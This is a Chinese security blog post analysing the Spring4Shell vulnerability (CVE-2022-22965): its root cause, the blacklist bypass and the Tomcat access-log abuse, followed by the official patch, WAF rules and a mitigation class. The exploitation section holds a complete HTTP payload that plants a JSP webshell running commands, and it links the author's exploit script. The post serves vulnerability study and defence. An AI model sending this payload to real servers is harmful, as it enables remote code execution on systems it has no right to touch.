<html>
<head>
    <meta charset="utf-8" />
<meta name="description" content="" />
<meta name="viewport" content="width=device-width, initial-scale=1" />

<title>Spring Framework RCE(CVE-2022-22965) | 6right</title>

<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">

<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->

<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>

<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
<!-- DEMO JS -->
<!--<script src="media/scripts/index.js"></script>-->



    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
</head>
<body>
<div class="main gt-bg-theme-color-first">
    <nav class="navbar navbar-expand-lg">
    <a class="navbar-brand" href="/">
        <img class="user-avatar" src="/images/avatar.png" alt="头像">
        <div class="site-name gt-c-content-color-first">
            6right
        </div>
    </a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <div class="navbar-nav mr-auto" style="text-align: center">
            
            <div class="nav-item">
                
                <a href="/" class="menu gt-a-link">
                    首页
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/archives" class="menu gt-a-link">
                    归档
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/tags" class="menu gt-a-link">
                    标签
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/post/about" class="menu gt-a-link">
                    关于
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/friends" class="menu gt-a-link">
                    友链
                </a>
                
            </div>
            
        </div>
        <div style="text-align: center">
            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
                action="/search/">
                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
            </form>
        </div>
    </div>
</nav>
<script>
    /* 移动端导航栏展开/收起切换 */
    document.getElementById('changeNavbar').onclick = () => {
        var element = document.getElementById('navbarSupportedContent');
        if (element.style.display === 'none' || element.style.display === '') {
            element.style.display = 'block';
        } else {
            element.style.display = 'none';
        }
    }
</script>

    <div class="post-container">
        <div class="post-detail gt-bg-theme-color-second">
            <article class="gt-post-content">
                <h2 class="post-title">
                    Spring Framework RCE(CVE-2022-22965)
                </h2>
                <div class="post-info">
                    <time class="post-time gt-c-content-color-first">
                        · 2022-04-02 ·
                    </time>
                    
                        <a href="https://liangyueliangyue.github.io/tag/_1xjK2YDa/" class="post-tags">
                            # Java安全
                        </a>
                    
                </div>
                <div class="post-content">
                    <h1 id="spring-framework-rcecve-2022-22965">Spring Framework RCE(CVE-2022-22965)</h1>
<h2 id="利用环境">利用环境</h2>
<ul>
<li>war包
<ul>
<li>https://github.com/fengguangbin/spring-rce-war</li>
</ul>
</li>
<li>docker环境
<ul>
<li>https://github.com/lunasec-io/Spring4Shell-POC</li>
<li>https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965</li>
</ul>
</li>
<li>在线环境
<ul>
<li>http://vulfocus.io</li>
</ul>
</li>
</ul>
<h2 id="漏洞原理">漏洞原理</h2>
<p>简答来说就是参数绑定造成的变量覆盖漏洞，漏洞点spring-beans包中。</p>
<p>Spring MVC 框架的参数绑定功能提供了将请求中的参数绑定控制器方法中参数对象的成员变量，通过 ClassLoader构造恶意请求获取AccessLogValue 对象并注入恶意字段值，来更改 Tomcat 服务器的日志记录属性触发 pipeline 机制写入任意路径下的文件。</p>
<h3 id="cve-2010-1622">CVE-2010-1622</h3>
<p>这个漏洞其实就是CVE-2010-1622的绕过，CVE-2010-1622可以参考Ruilin大佬写的</p>
<pre><code>http://rui0.cn/archives/1158
</code></pre>
<p>简单来说就是可以获取到Classloader，而在Tomcat中，一些和Tomcat的全局配置相关的属性都保存在<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>这个Tomcat专属的ClassLoader当中。</p>
<p>那么，我们就可以通过person.getClass().getClassLoader().getXXX()修改ParallelWebappClassLoader中的一些属性来修改Tomcat的配置项。也就是后面的利用：<strong>tomcat AccessLogValue</strong>，这里先不讲。</p>
<p>Spring对这个漏洞的修复方式，就是通过黑名单的方式，增加了if语句来检查用户输入。</p>
<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/5c623fa7f431436608fc1a8966aaa4af.png" alt="image-20220402125933198" loading="lazy"></figure>
<p>这个if语句的意思就是，当发现当前的对象是一个Class，然后又在获取其classLoader属性，则直接跳过。这样就断了之间的class.classLoader这条链。</p>
<p>至于为什么现在又绕过了，其实看payload就能看出端倪</p>
<pre><code>class.module.classLoader.resources.context.parent.pipeline.first.pattern
</code></pre>
<p>class.module.classLoader</p>
<p>这个module是什么，其实就是jdk9开始引入的模块系统（这也说明了为什么这个漏洞的影响范围是jdk9+）</p>
<pre><code>https://juejin.cn/post/6844903501311524871
</code></pre>
<p>module存在getClassLoader()方法,正好用来写一条新的链</p>
<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/51043c67de05bcac5bc536edfffb6e91.png" alt="image-20220402125222928" loading="lazy"></figure>
<p>之前的链</p>
<pre><code>class.classLoader.resources.context.parent.pipeline.first.pattern
</code></pre>
<p>现在</p>
<pre><code>class.module.classLoader.resources.context.parent.pipeline.first.pattern
</code></pre>
<p>其实就只是module链点的增加导致了了官方的黑名单防御被绕过</p>
<h3 id="tomcat-accesslogvalue">tomcat AccessLogValue</h3>
<p>这个利用手法在strust2上的ClassLoader 漏洞 (CVE-2014-0094) 上早就出现过</p>
<pre><code>https://www.exploit-db.com/exploits/33142
</code></pre>
<p>利用了 Tomcat 使用的<strong>ClassLoader</strong></p>
<p>该漏洞通过修改 Tomcat 的日志设置（通过AccessLogValve)来写入恶意文件</p>
<pre><code>https://tomcat.apache.org/tomcat-8.0-doc/config/valve.html
</code></pre>
<p>主要利用字段</p>
<table>
<thead>
<tr>
<th>directory</th>
<th>将放置此 Valve 创建的日志文件的目录的绝对或相对路径名。如果指定了相对路径，则将其解释为相对于 $CATALINA_BASE。如果未指定目录属性，则默认值为“logs”（相对于 $CATALINA_BASE）。</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>prefix</code></td>
<td>添加到每个日志文件名称开头的前缀。如果未指定，默认值为“access_log”。</td>
</tr>
<tr>
<td><code>suffix</code></td>
<td>添加到每个日志文件名称末尾的后缀。如果未指定，则默认值为“”（长度为零的字符串），表示不会添加后缀。</td>
</tr>
<tr>
<td><code>fileDateFormat</code></td>
<td>允许在访问日志文件名中自定义时间戳。每当格式化的时间戳更改时，文件就会旋转。默认值为<code>.yyyy-MM-dd</code>。如果您希望每小时轮换一次，则将此值设置为<code>.yyyy-MM-dd.HH</code>。日期格式将始终使用 locale 进行本地化<code>en_US</code>。</td>
</tr>
<tr>
<td><code>pattern</code></td>
<td><strong>一种格式布局，用于标识要记录的请求和响应中的各种信息字段，或者选择标准格式的 <code>common</code>单词<code>combined</code>。有关配置此属性的更多信息，请参见下文。</strong></td>
</tr>
</tbody>
</table>
<p>POC中class.classLoader.resources.context.parent.pipeline.first这个属性实际是org.apache.catalina.valves.AccessLogValve，在conf/server.xml里面有一段相关的配置：</p>
<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/09636baf89478116dea6f7c342a17acd.png" alt="image-20220331142224779" loading="lazy"></figure>
<p>为何修改了dataformat会触发切换日志呢？注意下面一个属性，默认是true</p>
<pre><code class="language-javascript"> .class.classLoader.resources.context.parent.pipeline.first.rotatable
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/438c56fc35a538922f3b46706ae492de.png" alt="image-20220331142915175" loading="lazy"></figure>
<p>每次Log时，都会调用rotate:</p>
<pre><code class="language-javascript">publicvoid log(CharArrayWriter message)  {rotate();…
</code></pre>
<p>而rotate是检查当前的systime 经过format后，与当前的tsDate是否相同。如果日期不同了，自然需要切换日志文件了：</p>
<pre><code class="language-javascript">public void rotate(){
    if (this.rotatable){
        long systime =System.currentTimeMillis();
        if (systime - this.rotationLastChecked&gt; 1000L)
            synchronized (this){
                if (systime -this.rotationLastChecked &gt; 1000L){
                    this.rotationLastChecked = systime; 
                String tsDate =this.fileDateFormatter.format(new Date(systime)); 
                if (!this.dateStamp.equals(tsDate)){
                    close(true);
                    this.dateStamp = tsDate;
                    open();
                }
            }
        }
    }
}
</code></pre>
<p>所以修改了dateFormat，就触发了日志切换。这是由tomcat代码决定的。在linux与windows下证实该问题均存在。</p>
<h2 id="漏洞复现">漏洞复现</h2>
<h3 id="payload">payload</h3>
<pre><code class="language-jsp">POST /index HTTP/1.1
Host: 192.168.137.222:8077
Content-Type: application/x-www-form-urlencoded
Accept: */*
Cache-Control: no-cache
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 494
suffix: %&gt;
prefix: &lt;%Runtime

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di.getRuntime%28%29.exec%28request.getParameger%28%22cmd%22%29%29%3B%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=C%3a%2Ftmp&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=6right&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
</code></pre>
<p>%不能够出现，需要使用占位符替换，占位符是什么？</p>
<h3 id="pattern参数自定义请求头">pattern参数自定义请求头</h3>
<p>AccessLogValve还支持写入信息传入或传出标头、cookie、会话或请求属性和特殊时间戳格式。它以 <a href="https://httpd.apache.org/">Apache HTTP Server</a>日志配置语法为模型。<code>xxx</code>它们中的每一个都可以使用不同的键 多次使用：</p>
<ul>
<li>%{xxx}i 请求headers的信息</li>
<li>%{xxx}o 响应headers的信息</li>
<li>%{xxx}c 请求cookie的信息</li>
<li>%{xxx}r xxx是ServletRequest的一个属性</li>
<li>%{xxx}s xxx是HttpSession的一个属性</li>
</ul>
<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/5c57e18af827f593e40da69458474499.png" alt="image-20220330220206577" loading="lazy"></figure>
<p>所以我们可以通过日志的配置语法来进行占位符写入%</p>
<h2 id="利用脚本编写">利用脚本编写</h2>
<h3 id="问题一">问题一</h3>
<p>日志的机制，初次写入之后不能改变写入文件名称以及内容路径，且每次访问都会追加一次内容</p>
<h4 id="解决">解决</h4>
<ol>
<li>写入webshell加上&lt;!--注释后面的内容</li>
<li>执行内容为写入内容到其他文件中</li>
</ol>
<p>根本解决：<strong>修改dataformat可以触发切换日志，是tomcat日志决定的</strong></p>
<h3 id="问题二">问题二</h3>
<p>写入内容不能存在%，会变成三个问号</p>
<h4 id="解决-2">解决</h4>
<p>使用占位符解决</p>
<h3 id="持久化利用">持久化利用</h3>
<p>写入内存马？（没去实现）</p>
<h2 id="脚本实现">脚本实现</h2>
<ol>
<li>漏洞探测</li>
<li>写入冰蝎马</li>
<li>自定义写入文件名称及路径</li>
<li>不会追加写入到同一文件中</li>
</ol>
<p>脚本github地址，记得给个☆</p>
<pre><code>https://github.com/liangyueliangyue/spring-core-rce
</code></pre>
<h2 id="官方修复">官方修复</h2>
<ul>
<li>https://github.com/spring-projects/spring-framework/commit/afbff391d8299034cd98af968981504b6ca7b38c</li>
</ul>
<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/f502f1ee267688e13c27198078198f0b.png" alt="image-20220402131253696" loading="lazy"></figure>
<p>可以看到，这次官方不在采用黑名单的形式去防御（不然继续过滤module，以后更新还有modulf ， modulg等等，就天天打补丁了），而是采用白名单，当beanClass是class.Class时，只允许添加name属性。并且如果属性是<code>ClassLoader</code> 和 <code>ProtectionDomain</code>，会被忽略。</p>
<h2 id="waf防御">waf防御</h2>
<p>对“class.<em>”“Class.</em>”“<em>.class.</em>”“<em>.Class.</em>”等字符串，部署规则进行过滤</p>
<h2 id="临时修复">临时修复</h2>
<p>需同时按以下两个步骤进行漏洞的临时修复:</p>
<ol>
<li>在应用中全局搜索@InitBinder注解，看看方法体内是否调用dataBinder.setDisallowedFields方法，如果发现此代码片段的引入，则在原来的黑名单中，添加{&quot;class.<em>&quot;,&quot;Class.</em> &quot;,&quot;<em>. class.</em>&quot;, &quot;<em>.Class.</em>&quot;}。 (注:如果此代码片段使用较多,需要每个地方都追加)</li>
<li>在应用系统的项目包下新建以下全局类，并保证这个类被Spring 加载到(推荐在Controller 所在的包中添加).完成类添加后，需对项目进行重新编译打包和功能验证测试。并重新发布项目。</li>
</ol>
<pre><code class="language-java">import org.springframework.core.annotation.Order;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.InitBinder;
@ControllerAdvice
@Order(10000)
public class GlobalControllerAdvice{ 
 @InitBinder
 public void setAllowedFields(webdataBinder dataBinder){
     String[]abd=new string[]{&quot;class.*&quot;,&quot;Class.*&quot;,&quot;*.class.*&quot;,&quot;*.Class.*&quot;};
     dataBinder.setDisallowedFields(abd);
 }
}
</code></pre>
<h2 id="后记">后记</h2>
<p>这次的spring漏洞传的沸沸扬扬，最后的结果却是雷声大雨点小。当前确定的spring 框架漏洞前置条件比较苛刻，影响范围并不大，并不能做到比肩log4j</p>
<p>目前来看后续的利用只能围绕classLoader去进行深入挖掘。</p>

                </div>
            </article>
        </div>

        
            <div class="next-post">
                <div class="next gt-c-content-color-first">下一篇</div>
                <a href="https://liangyueliangyue.github.io/post/javasec-rmi/" class="post-title gt-a-link">
                    JavaSec-RMI
                </a>
            </div>
        

        
            <span id="/post/spring-framework-rcecve-2022-22965/" class="leancloud_visitors" data-flag-title="Spring Framework RCE(CVE-2022-22965)">
                <em class="post-meta-item-text">阅读量 </em>
                <i class="leancloud-visitors-count">0</i>
            </span>
        

        

        
            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>

<style>
	div#vcomments{
		width:100%;
		max-width: 1000px;
		padding: 2.5%
	}
</style>


	<div id="vcomments"></div>

<script>
	new Valine({
		el: '#vcomments',
		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
		avatar: 'monsterid',
		pageSize: 5,
		recordIp: false,
		placeholder: '留下你的评论！',
		visitor: true,
	});
</script>

        

        <div class="site-footer gt-c-content-color-first">
    <div class="slogan gt-c-content-color-first">温润如玉</div>
    <div class="social-container">
        
            
                <a href="https://github.com/liangyueliangyue" target="_blank">
                    <i class="fab fa-github gt-c-content-color-first"></i>
                </a>
            
        
            
        
            
        
            
        
            
        
            
        
    </div>
    <div class="footer-info">
        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
    </div>
    <div>
        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
    </div>
</div>

<script>
  hljs.highlightAll()
</script>

    </div>
</div>
</body>
</html>
